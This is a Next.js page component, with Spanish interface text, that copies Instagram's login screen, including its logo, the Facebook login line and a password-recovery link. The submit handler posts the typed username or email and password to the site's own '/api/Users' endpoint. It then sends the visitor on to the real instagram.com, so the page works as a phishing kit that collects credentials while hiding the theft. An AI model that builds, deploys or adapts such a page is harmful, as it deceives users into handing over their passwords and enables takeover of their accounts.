import Image from 'next/image'
import { useState, useEffect } from 'react'
import styles from '../styles/Home.module.css'
import { Button, Form, Loader} from 'semantic-ui-react';
import {useRouter} from 'next/router'
import Head from 'next/head';

export default function Home() {
  const [form, setForm] = useState({email: '', password:''});
  const [errors, setErrors] = useState({});
  const [isSubmiting, setIsSubmiting] = useState(false);
  const router = useRouter();

useEffect(() => {
    if (isSubmiting) {
        if (Object.keys(errors).length === 0) {
            crearUsuario();
        }
        else {
            setIsSubmiting(false);
        }
    }
}, [errors])

  const crearUsuario = async () =>{
    try {
      const res = await fetch('/api/Users', {
        method: 'POST',
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
          body: JSON.stringify(form) 
      });
      router.push("https://www.instagram.com/");
    } catch (error) {
      console.log(error);
    }
  }

  const handleSubmit = (e) =>{
    e.preventDefault();
    let errs = validar();
    setErrors(errs);
    setIsSubmiting(true);

  }

  const handleChange = (e) =>{
    setForm({
      ...form,
      [e.target.name]: e.target.value
    })
  }

  const validar = () =>{
    let error = {}

    if(!form.email){
      error.email = "Debe ingresar un correo valido";
    }
    if(!form.password){
      error.password = "Debe ingresar una contraseña";
    }
    return error
  }

  return (
    <div>
      <div>
        <Head>
             <link rel="icon" href="/favicon.ico" />
        </Head>
      </div>
    <div className="container mx-auto">
      <div className="flex justify-center px-6 my-12">
        {/* Row */}
        <div className="w-full xl:w-3/4 lg:w-11/12 flex">
          {/* Col */}
          <div className="w-full h-auto hidden lg:block lg:w-5/12 bg-cover rounded-l-lg">
            <Image
              src="/images/Iphone.png"
              alt="instagram"
              width={454}
              height={618}
            />
          </div>
          {/* Col */}
          <div className="w-full lg:w-7/12 bg-white p-5 rounded-lg lg:rounded-l-none">
            <div className={styles.box1}>
              <div className={styles.logo1}>
                <p></p>
                <Image
                  src="/images/instagram.png"
                  alt="instagram"
                  width={175}
                  height={60}
                />
              </div>
              {/* Formulario */}
              {isSubmiting ? (
                <Loader active inline="centered" />
              ) : (
                <Form onSubmit={handleSubmit}>
                  <Form.Input
                    fluid
                    className={styles.input}
                    error={
                      errors.email
                        ? {
                            content: "Ingrese un email valido",
                            pointing: "below",
                          }
                        : null
                    }
                    placeholder="Télefono, usuario, o correo electrónico"
                    name="email"
                    onChange={handleChange}
                  />
                  <Form.Input
                    fluid
                    type="password"
                    className={styles.input}
                    error={
                      errors.password
                        ? {
                            content: "Ingrese una contraseña",
                            pointing: "below",
                          }
                        : null
                    }
                    placeholder="Contraseña"
                    name="password"
                    onChange={handleChange}
                  />
                  <div className={styles.btn}>
                    <Button type="submit" className={styles.btn}>
                      <a className={styles.link1}>Iniciar sesión</a>
                    </Button>
                  </div>
                </Form>
              )}
              {/* Linea  */}
              <div className={styles.or}>
                <div className={styles.line}></div>
                <p className={styles.texto1}>O</p>
                <div className={styles.line}></div>
              </div>

              <div>
                <div className={styles.fb}>
                  <Image
                    className={styles.img3}
                    src="/images/facebook.png"
                    alt="facebook"
                    width={16}
                    height={16}
                  />
                  <p className={styles.parrafofb}>
                    Iniciar sesión con Facebook
                  </p>
                </div>
                <div className={styles.forgot}>
                  <a className={styles.aforgot} href="#">
                    ¿Has olvidado la contraseña?
                  </a>
                </div>
              </div>
              <div className={styles.signup}>
                <p>
                  ¿No tienes una cuenta?{" "}
                  <a className={styles.txregistro} href="#">
                    Regístrate
                  </a>
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    </div>
  );
}
